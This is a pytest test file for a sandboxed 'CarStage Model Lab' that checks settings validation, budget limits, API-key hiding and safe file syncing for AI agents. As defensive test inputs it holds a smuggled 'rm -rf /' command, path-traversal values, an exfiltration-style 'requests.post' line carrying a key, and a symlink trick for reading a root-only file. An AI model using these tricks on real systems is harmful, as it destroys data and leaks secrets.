"""CarStage Model Lab: validation, budget guard, key handling, result collection."""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

from conftest import run

import lab
import sandbox

FAKE_RUNNER = '''
import json, os, sys
from pathlib import Path
req = json.loads(Path(sys.argv[1]).read_text())
out = Path(req["out_dir"])
mode = "fail" if (Path(req["code_dir"]) / "FAIL").exists() else "ok"
seen = {"gemini_key_present": bool(os.environ.get("GEMINI_API_KEY")),
        "override": os.environ.get("GEMINI_SEC_BACKGROUND_FIT_MODEL"),
        "argv": sys.argv}
if mode == "ok":
    (out / "final.png").write_bytes(b"\\x89PNG fake")
    meta = {"ok": True, "models": {"synthesis": seen["override"]}, "seen": seen}
else:
    meta = {"ok": False, "error": "boom with key " + os.environ.get("GEMINI_API_KEY", ""), "seen": seen}
(out / "meta.json").write_text(json.dumps(meta))
(out / "secret-dump.txt").write_text(os.environ.get("GEMINI_API_KEY", ""))
'''


@pytest.fixture
def labenv(base, monkeypatch):
    code = base / "carstage"
    (code / "backend" / "compose_api").mkdir(parents=True)
    (code / "backend" / "compose_api" / "config.py").write_text(
        'GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "").strip()\n'
        'GEMINI_SEC_BACKGROUND_FIT_MODEL = os.getenv("GEMINI_SEC_BACKGROUND_FIT_MODEL", "gemini-3-pro-image")\n'
        'SEC_SHADOW_OPACITY = float(os.getenv("SEC_SHADOW_OPACITY", "0.45"))\n'
        'UPLOAD_DIR = Path(os.getenv("COMPOSE_UPLOAD_DIR", "x"))\n')
    runner = base / "runner.py"
    runner.write_text(FAKE_RUNNER)
    monkeypatch.setattr(lab, "VENV_PY", Path(sys.executable))
    monkeypatch.setattr(lab, "RUNNER", runner)
    monkeypatch.setattr(lab, "LAB_HOME", base / "labhome")
    monkeypatch.setattr(lab, "FOCUS_PIPELINES", [])          # tests use every pipeline
    monkeypatch.setattr(lab, "FOCUS_FILE", base / "FOCUS.md")
    monkeypatch.setitem(sandbox._secrets, "LAB_GEMINI_API_KEY", "AIza_TEST_LAB_KEY")
    monkeypatch.delitem(sandbox._secrets, "LAB_OPENAI_API_KEY", raising=False)
    job_dir = base / "job"
    (job_dir / "input").mkdir(parents=True)
    (job_dir / "input" / "car.jpg").write_bytes(b"\xff\xd8 car")
    (job_dir / "input" / "stage.png").write_bytes(b"\x89PNG stage")
    (base / "outside.jpg").write_bytes(b"x")
    job = {"id": "j1", "agent": "model-lab", "dir": str(job_dir)}
    return lab.CarStageLab(25.0, code_dir=code), job, base


def test_only_config_settings_and_no_secrets_or_paths_are_overridable(labenv):
    lb, job, _ = labenv
    allowed = lab.allowed_settings(lb.code_dir)
    assert "GEMINI_SEC_BACKGROUND_FIT_MODEL" in allowed and "SEC_SHADOW_OPACITY" in allowed
    assert "GEMINI_API_KEY" not in allowed and "COMPOSE_UPLOAD_DIR" not in allowed
    base_args = {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png"}
    for settings, why in [({"GEMINI_API_KEY": "x"}, "protected"), ({"PATH": "/tmp"}, "protected"),
                          ({"GEMINI_SEC_BACKGROUND_FIT_MODEL": "a b; rm -rf /"}, "characters")]:
        _, err = lb.validate(job, {**base_args, "settings": settings})
        assert err and why in err
    _, err = lb.validate(job, {**base_args, "car": "../outside.jpg"})
    assert err and "inside this job folder" in err
    _, err = lb.validate(job, {**base_args, "pipeline": "openai_compose"})
    assert err and "No Openai key" in err
    _, err = lb.validate(job, {**base_args, "prompt": "make it pink"})
    assert err and "doesn't take a prompt" in err


def test_run_collects_results_charges_budget_and_hides_the_key(labenv, monkeypatch):
    lb, job, _ = labenv
    saved = []
    out = run(lb.run(job, {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png",
                           "settings": {"GEMINI_SEC_BACKGROUND_FIT_MODEL": "gemini-3.1-flash-image-preview"},
                           "label": "SEC flash!"}, lambda: saved.append(1)))
    res = json.loads(out)
    assert res["ok"] and res["run"] == 1 and saved
    folder = Path(res["folder"])
    assert folder.name == "001-sec-sec-flash"
    assert sorted(p.name for p in folder.iterdir()) == ["final.png", "meta.json", "settings.json"]
    meta = json.loads((folder / "meta.json").read_text())
    assert meta["seen"]["gemini_key_present"] and meta["seen"]["override"] == "gemini-3.1-flash-image-preview"
    assert all("AIza" not in a for a in meta["seen"]["argv"])          # never on the command line
    assert job["lab_spent"] == res["estimated_cost_usd"] > 0
    assert not list((lab.LAB_HOME / "runs").glob("*")), "work folder must be removed"


def test_failed_run_reports_error_without_leaking_key(labenv, monkeypatch):
    lb, job, _ = labenv
    (lb.code_dir / "FAIL").write_text("1")
    res = json.loads(run(lb.run(job, {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png"},
                                lambda: None)))
    assert not res["ok"] and "boom" in json.dumps(res)
    blob = json.dumps(res) + (Path(res["folder"]) / "meta.json").read_text()
    assert "AIza_TEST_LAB_KEY" not in blob


def test_budget_guard_refuses_before_spending(labenv):
    lb, job, _ = labenv
    job["lab_round_spent"] = 24.9
    out = run(lb.run(job, {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png"}, lambda: None))
    assert out.startswith("Refused: budget")
    assert job["lab_round_spent"] == 24.9 and not job.get("lab_runs")
    lab.new_round(job)                       # the owner replies: a new round, fresh budget
    res = json.loads(run(lb.run(job, {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png"},
                                lambda: None)))
    assert res["ok"] and job["lab_round"] == 2 and job["lab_round_spent"] == res["estimated_cost_usd"]
    assert lab.recent_runs([Path(job["dir"])])[0]["name"].startswith("001-sec")


def test_lab_keys_never_reach_agents():
    env = sandbox.agent_env()
    for k in ("LAB_GEMINI_API_KEY", "LAB_OPENAI_API_KEY", "GEMINI_API_KEY", "OPENAI_API_KEY"):
        assert env.get(k) == ""


def test_estimates_follow_the_chosen_models():
    flash, _ = lab.estimate("sec", {"GEMINI_SEC_BACKGROUND_FIT_MODEL": "gemini-3.1-flash-image-preview"})
    pro, _ = lab.estimate("sec", {})
    assert flash < pro
    hi, _ = lab.estimate("openai_compose", {"OPENAI_IMAGE_EDIT_QUALITY": "high"})
    lo, _ = lab.estimate("openai_compose", {"OPENAI_IMAGE_EDIT_QUALITY": "low"})
    assert lo < hi


def test_run_that_cannot_start_is_refunded(labenv, monkeypatch):
    lb, job, _ = labenv
    def no_start(*a, **k):
        raise FileNotFoundError(2, "No such file or directory", "runuser")
    monkeypatch.setattr(lab, "_lab_user_exists", lambda: False)
    monkeypatch.setattr(lab.subprocess, "Popen", no_start)
    out = run(lb.run(job, {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png"}, lambda: None))
    assert out.startswith("Lab error (not charged)")
    assert job["lab_spent"] == 0 and job["lab_round_spent"] == 0 and job["lab_runs"] == 0


def test_runuser_is_found_outside_the_minimal_path():
    import shutil as sh
    found = sh.which("runuser") or sh.which("runuser", path="/usr/sbin:/sbin")
    if found is None:
        pytest.skip("runuser not installed here")
    assert Path(found).exists()


def test_agents_can_receive_large_messages(make_orch):
    o = make_orch()
    assert o._options().max_buffer_size >= 32 * 1024 * 1024
    job = o.studio._new_job("model-lab", "test")
    assert o.studio._options(job).max_buffer_size >= 32 * 1024 * 1024


def test_sync_shows_changes_flags_risky_lines_and_never_copies_settings(tmp_path):
    src, dst = tmp_path / "src", tmp_path / "dst"
    for root in (src, dst):
        (root / "backend" / "compose_api").mkdir(parents=True)
        (root / "backend" / "compose_api" / "same.py").write_text("x = 1\n")
    (dst / "backend" / "compose_api" / "old.py").write_text("gone\n")
    (src / "backend" / "compose_api" / "sec.py").write_text("import requests\nrequests.post('http://x', data=key)\n")
    (src / "backend" / "bg_replace").mkdir()
    (src / "backend" / "bg_replace" / "settings.py").write_text("AWS_SECRET='x'\n")
    (src / "backend" / ".env").write_text("OPENAI_API_KEY=sk\n")
    (src / "backend" / "__pycache__").mkdir()
    (src / "backend" / "__pycache__" / "a.pyc").write_bytes(b"x")
    plan = lab.sync_plan(src, dst)
    assert plan["added"] == ["backend/compose_api/sec.py"] and plan["removed"] == ["backend/compose_api/old.py"]
    assert plan["changed"] == [] and any("requests.post" in f for f in plan["flags"])
    assert lab.sync_apply(src, dst) == 2
    assert (dst / "backend" / "compose_api" / "sec.py").exists()
    assert not (dst / "backend" / "compose_api" / "old.py").exists()
    assert not (dst / "backend" / "bg_replace" / "settings.py").exists()
    assert not (dst / "backend" / ".env").exists()
    assert lab.sync_plan(src, dst) == {"added": [], "changed": [], "removed": [], "flags": []}


def test_pm_lab_accepts_inputs_from_the_project(labenv, make_orch):
    lb, _, base = labenv
    o = make_orch()
    job = o.pm_lab_job()
    (o.cfg.workspace / "photos").mkdir(exist_ok=True)
    (o.cfg.workspace / "photos" / "car.jpg").write_bytes(b"\xff\xd8 car")
    (Path(job["dir"]) / "input" / "stage.png").write_bytes(b"\x89PNG")
    req, err = lb.validate(job, {"pipeline": "sec", "car": str(o.cfg.workspace / "photos" / "car.jpg"),
                                 "stage": "input/stage.png"})
    assert err is None and req["files"]["car"].name == "car.jpg"
    _, err = lb.validate(job, {"pipeline": "sec", "car": str(base / "outside.jpg"), "stage": "input/stage.png"})
    assert err and "the lab folder or the project" in err


def test_pm_can_switch_status_to_another_project(make_orch):
    o = make_orch()
    ws = o.cfg.workspace
    (ws / "docs").mkdir(exist_ok=True)
    (ws / "docs" / "PROGRESS.md").write_text("| ID | Task | Owner | Status | Depends on |\n|---|---|---|---|---|\n"
                                              "| T-1 | StocFresh login | backend-dev | done | |\n")
    (ws / "carstage" / "docs").mkdir(parents=True)
    (ws / "carstage" / "docs" / "PROGRESS.md").write_text(
        "| ID | Task | Owner | Status | Depends on |\n|---|---|---|---|---|\n"
        "| C-01 | Plate restore in SEC | backend-dev | done | |\n| C-05 | Lab re-test | pm | todo | |\n")
    assert "StocFresh login" in o.status(full=True)
    assert o.set_active_project("carstage", "carstage", "CarStage").startswith("OK")
    st = o.status(full=True)
    assert "CarStage" in st and "Lab re-test" in st and "StocFresh login" not in st
    assert "📁 " in st and "/status " in st
    assert o.set_active_project("x", "../etc", "").startswith("Refused")
    assert o.set_active_project("x", "docs", "").startswith("Refused")
    assert o.set_active_project("main", ".", "").startswith("OK")
    assert "StocFresh login" in o.status(full=True)


def test_other_project_is_taken_out_of_the_main_repo(make_orch):
    import subprocess
    o = make_orch()
    ws = o.cfg.workspace
    (ws / "carstage" / "docs").mkdir(parents=True)
    (ws / "carstage" / "docs" / "PROGRESS.md").write_text("x")
    (ws / "carstage" / "docs" / "SPEC.md").write_text("x")
    subprocess.run(["git", "add", "-A"], cwd=ws, check=True)
    subprocess.run(["git", "commit", "-qm", "oops"], cwd=ws, check=True)
    msg = o.set_active_project("carstage", "carstage", "CarStage")
    assert "removed from the repo" in msg
    assert subprocess.run(["git", "ls-files", "carstage"], cwd=ws, capture_output=True, text=True).stdout == ""
    assert (ws / "carstage" / "docs" / "PROGRESS.md").exists()
    assert "/carstage/" in (ws / ".git" / "info" / "exclude").read_text()
    assert subprocess.run(["git", "status", "--porcelain"], cwd=ws, capture_output=True, text=True).stdout == ""


def test_focus_limits_pipelines_and_applies_lab_defaults(labenv, monkeypatch):
    lb, job, base = labenv
    monkeypatch.setattr(lab, "FOCUS_PIPELINES", ["optimal", "gemini_compose", "openai_compose"])
    monkeypatch.setitem(sandbox._secrets, "LAB_OPENAI_API_KEY", "sk-test")
    (lb.code_dir / "backend" / "compose_api" / "config.py").write_text(
        'OPENAI_IMAGE_EDIT_MODEL = os.getenv("OPENAI_IMAGE_EDIT_MODEL", "gpt-image-1.5")\n'
        'OPENAI_IMAGE_EDIT_QUALITY = os.getenv("OPENAI_IMAGE_EDIT_QUALITY", "medium")\n')
    _, err = lb.validate(job, {"pipeline": "sec", "car": "input/car.jpg", "stage": "input/stage.png"})
    assert err and "not in the owner's focus" in err
    req, err = lb.validate(job, {"pipeline": "openai_compose", "car": "input/car.jpg", "stage": "input/stage.png"})
    assert err is None and req["overrides"] == {"OPENAI_IMAGE_EDIT_MODEL": "gpt-image-2"}
    req, _ = lb.validate(job, {"pipeline": "openai_compose", "car": "input/car.jpg", "stage": "input/stage.png",
                               "settings": {"OPENAI_IMAGE_EDIT_MODEL": "gpt-image-1.5"}})
    assert req["overrides"]["OPENAI_IMAGE_EDIT_MODEL"] == "gpt-image-1.5"     # the agent can still compare
    (base / "FOCUS.md").write_text("PLATE STAYS ORIGINAL")
    info = lb.info(job)
    assert "PLATE STAYS ORIGINAL" in info and "- sec:" not in info and "Not in focus" in info


def test_sync_never_touches_model_weights(tmp_path):
    src, dst = tmp_path / "src", tmp_path / "dst"
    (src / "backend" / "models").mkdir(parents=True)
    (dst / "backend" / "models").mkdir(parents=True)
    (dst / "backend" / "models" / "yolov8n-seg.onnx").write_bytes(b"weights")
    lab.sync_apply(src, dst)
    assert (dst / "backend" / "models" / "yolov8n-seg.onnx").exists()


def test_sync_snapshot_has_no_links_and_is_what_gets_installed(base):
    tmp_path = base
    src, dst, data = tmp_path / "src", tmp_path / "dst", tmp_path / "data"
    (src / "backend" / "compose_api").mkdir(parents=True)
    (dst / "backend").mkdir(parents=True)
    data.mkdir()
    (src / "backend" / "compose_api" / "a.py").write_text("x = 1\n")
    (tmp_path / "secret.txt").write_text("ROOT ONLY")
    (src / "backend" / "leak.txt").symlink_to(tmp_path / "secret.txt")     # an agent's trick
    import os
    os.chmod(tmp_path, 0o755)
    for d in (src, src / "backend", src / "backend" / "compose_api"):
        os.chmod(d, 0o755)
    os.chmod(src / "backend" / "compose_api" / "a.py", 0o644)
    snap = lab.snapshot(src, data)
    assert (snap / "backend" / "compose_api" / "a.py").read_text() == "x = 1\n"
    assert not (snap / "backend" / "leak.txt").exists()
    (src / "backend" / "compose_api" / "a.py").write_text("x = 'changed after review'\n")
    lab.sync_apply(snap, dst)
    assert (dst / "backend" / "compose_api" / "a.py").read_text() == "x = 1\n"
    assert not (dst / "backend" / "leak.txt").exists()
